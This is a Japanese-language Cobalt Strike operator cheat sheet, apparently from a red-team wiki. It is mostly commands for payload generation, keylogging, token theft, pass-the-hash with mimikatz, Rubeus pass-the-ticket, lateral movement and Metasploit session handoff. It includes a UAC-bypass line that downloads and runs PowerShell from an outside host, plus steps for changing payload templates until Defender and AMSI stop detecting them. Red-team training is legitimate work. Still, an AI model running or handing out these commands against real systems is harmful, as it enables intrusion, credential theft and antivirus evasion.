# Cobalt Strike

### リスナー

### C2 リスナー

`Cobalt Strike -> Listeners -> Add/Edit` その後、リスンする場所、使用するビークンの種類（http、dns、smb...）などを選択できます。

### Peer2Peer リスナー

これらのリスナーのビークンは、C2と直接通信する必要はなく、他のビークンを通じて通信できます。

`Cobalt Strike -> Listeners -> Add/Edit` その後、TCPまたはSMBビークンを選択する必要があります。

* **TCPビークンは選択したポートにリスナーを設定します**。TCPビークンに接続するには、別のビークンから `connect <ip> <port>` コマンドを使用します。
* **smbビークンは選択した名前のパイプ名でリスンします**。SMBビークンに接続するには、`link [target] [pipe]` コマンドを使用する必要があります。

### ペイロードの生成とホスティング

#### ファイル内のペイロードの生成

`Attacks -> Packages ->`&#x20;

* **`HTMLApplication`** HTAファイル用
* **`MS Office Macro`** マクロ付きのオフィス文書用
* **`Windows Executable`** .exe、.dll、またはサービス .exe 用
* **`Windows Executable (S)`** **ステージレス** .exe、.dll、またはサービス .exe 用（ステージレスの方がステージ付きよりも良い、IoCsが少ない）

#### ペイロードの生成とホスティング

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` これにより、Cobalt Strikeからビークンをダウンロードするためのスクリプト/実行可能ファイルが生成されます。形式は bitsadmin、exe、powershell、python などです。

#### ペイロードのホスティング

ホスティングしたいファイルがすでにウェブサーバーにある場合は、`Attacks -> Web Drive-by -> Host File` に移動し、ホストするファイルとウェブサーバーの設定を選択します。

### ビークンオプション

<pre class="language-bash"><code class="lang-bash"># ローカル .NET バイナリを実行
execute-assembly &#x3C;/path/to/executable.exe>

# スクリーンショット
printscreen    # PrintScr メソッドを使用して単一のスクリーンショットを撮る
screenshot     # 単一のスクリーンショットを撮る
screenwatch    # デスクトップの定期的なスクリーンショットを撮る
## 表示 -> スクリーンショットに移動して確認する

# キーロガー
keylogger [pid] [x86|x64]
## 表示 > キーストロークで押されたキーを確認する

# ポートスキャン
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 別のプロセス内にポートスキャンアクションを注入
portscan [targets] [ports] [arp|icmp|none] [max connections]

# PowerShell
# PowerShell モジュールをインポート
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;ここにpowershellコマンドを記述>

# ユーザーのなりすまし
## クレデンシャルを使用したトークン生成
make_token [DOMAIN\user] [password] # ネットワーク内のユーザーをなりすますためのトークンを作成
ls \\computer_name\c$ # 生成したトークンを使用してコンピュータのC$にアクセスを試みる
rev2self # make_tokenで生成したトークンの使用を停止
## make_tokenの使用はイベント4624を生成します: アカウントが正常にログオンしました。このイベントはWindowsドメインで非常に一般的ですが、ログオンタイプでフィルタリングすることで絞り込むことができます。上記のように、これはLOGON32_LOGON_NEW_CREDENTIALSを使用し、タイプは9です。

# UAC バイパス
elevate svc-exe &#x3C;listener>
elevate uac-token-duplication &#x3C;listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## pidからトークンを盗む
## make_tokenのようですが、プロセスからトークンを盗む
steal_token [pid] # これはネットワークアクションに役立ちますが、ローカルアクションには役立ちません
## APIドキュメントから、このログオンタイプは「呼び出し元が現在のトークンをクローンできることを許可します」とわかります。これが、ビークンの出力に「なりすまし &#x3C;current_username>」と表示される理由です - 自分のクローントークンをなりすましています。
ls \\computer_name\c$ # 生成したトークンを使用してコンピュータのC$にアクセスを試みる
rev2self # steal_tokenからのトークンの使用を停止

## 新しいクレデンシャルでプロセスを起動
spawnas [domain\username] [password] [listener] # 読み取りアクセスのあるディレクトリから実行する: cd C:\
## make_tokenのように、これによりWindowsイベント4624が生成されます: アカウントが正常にログオンしましたが、ログオンタイプは2（LOGON32_LOGON_INTERACTIVE）です。呼び出しユーザー（TargetUserName）となりすましユーザー（TargetOutboundUserName）が詳細に記載されます。

## プロセスに注入
inject [pid] [x64|x86] [listener]
## OpSecの観点から: 本当に必要でない限り、クロスプラットフォームの注入は行わないでください（例: x86 -> x64 または x64 -> x86）。

## ハッシュをパス
## この修正プロセスは、LSASSメモリのパッチを必要とし、高リスクのアクションであり、ローカル管理者権限が必要で、Protected Process Light (PPL) が有効な場合はあまり実行可能ではありません。
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## mimikatzを介してハッシュをパス
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## /runなしで、mimikatzはcmd.exeを生成します。デスクトップを持つユーザーとして実行している場合、シェルが表示されます（SYSTEMとして実行している場合は問題ありません）。
steal_token &#x3C;pid> # mimikatzによって作成されたプロセスからトークンを盗む

## チケットをパス
## チケットをリクエスト
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
## 新しいチケットを使用するための新しいログオンセッションを作成します（侵害されたものを上書きしないため）。
make_token &#x3C;domain>\&#x3C;username> DummyPass
## 攻撃者のマシンにチケットを書き込み、PowerShellセッションから読み込みます &#x26; 
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## SYSTEMからチケットをパス
## チケットを持つ新しいプロセスを生成
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## そのプロセスからトークンを盗む
steal_token &#x3C;pid>

## チケットを抽出 + チケットをパス
### チケットのリスト
execute-assembly C:\path\Rubeus.exe triage
### luidによる興味深いチケットをダンプ
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### 新しいログオンセッションを作成し、luidとprocessidを記録
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### 生成されたログオンセッションにチケットを挿入
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### 最後に、その新しいプロセスからトークンを盗む
steal_token &#x3C;pid>

# 横移動
## トークンが作成されている場合、それが使用されます
jump [method] [target] [listener]
## メソッド:
## psexec                    x86   サービスを使用してサービスEXEアーティファクトを実行
## psexec64                  x64   サービスを使用してサービスEXEアーティファクトを実行
## psexec_psh                x86   サービスを使用してPowerShellワンライナーを実行
## winrm                     x86   WinRM経由でPowerShellスクリプトを実行
## winrm64                   x64   WinRM経由でPowerShellスクリプトを実行

remote-exec [method] [target] [command]
## メソッド:
<strong>## psexec                          サービスコントロールマネージャー経由でリモート実行
</strong>## winrm                           WinRM（PowerShell）経由でリモート実行
## wmi                             WMI経由でリモート実行

## wmiでビークンを実行するには（jumpコマンドには含まれていません）、ビークンをアップロードして実行します
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Metasploitへのセッションのパス - リスナーを介して
## Metasploitホストで
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Cobaltで: Listeners > Addを選択し、PayloadをForeign HTTPに設定します。Hostを10.10.5.120、Portを8080に設定し、保存をクリックします。
beacon> spawn metasploit
## 外部リスナーでx86 Meterpreterセッションのみを生成できます。

# Metasploitへのセッションのパス - シェルコード注入を介して
## Metasploitホストで
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## msfvenomを実行し、multi/handlerリスナーを準備します。

## binファイルをCobalt Strikeホストにコピー
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin # x64プロセスにMetasploitシェルコードを注入

# MetasploitセッションをCobalt Strikeにパス
## ステージレスビークンシェルコードを生成します。Attacks > Packages > Windows Executable (S)に移動し、希望のリスナーを選択し、出力タイプとしてRawを選択し、x64ペイロードを使用します。
## Metasploitでpost/windows/manage/shellcode_injectを使用して生成されたCobalt Strikeシェルコードを注入します。


# ピボッティング
## チームサーバーでソックスプロキシを開く
beacon> socks 1080

# SSH接続
beacon> ssh 10.10.17.12:22 username password</code></pre>

## AVを回避する

### アーティファクトキット

通常、`/opt/cobaltstrike/artifact-kit` に、Cobalt Strikeがバイナリビークンを生成するために使用するコードと事前コンパイルされたテンプレート（`/src-common`内）を見つけることができます。

生成されたバックドア（またはコンパイルされたテンプレート）を使用して [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) を使用すると、Defenderがトリガーされる原因を特定できます。通常は文字列です。したがって、バックドアを生成しているコードを修正して、その文字列が最終的なバイナリに表示されないようにすることができます。

コードを修正した後、同じディレクトリから `./build.sh` を実行し、`dist-pipe/` フォルダーをWindowsクライアントの `C:\Tools\cobaltstrike\ArtifactKit` にコピーします。
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
`dist-pipe\artifact.cna`という攻撃的なスクリプトを読み込むのを忘れないでください。これにより、Cobalt Strikeが使用したいディスク上のリソースを使用し、読み込まれたリソースではなくなります。

### Resource Kit

ResourceKitフォルダーには、Cobalt Strikeのスクリプトベースのペイロード用のテンプレートが含まれています。これにはPowerShell、VBA、HTAが含まれます。

[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)をテンプレートと一緒に使用することで、Defender（この場合はAMSI）が好まないものを見つけて修正できます。
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
検出された行を修正することで、捕まらないテンプレートを生成できます。

`ResourceKit\resources.cna`という攻撃的なスクリプトを読み込むことを忘れないでください。これにより、Cobalt Strikeに読み込まれたリソースではなく、ディスクから使用したいリソースを使用するよう指示します。
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

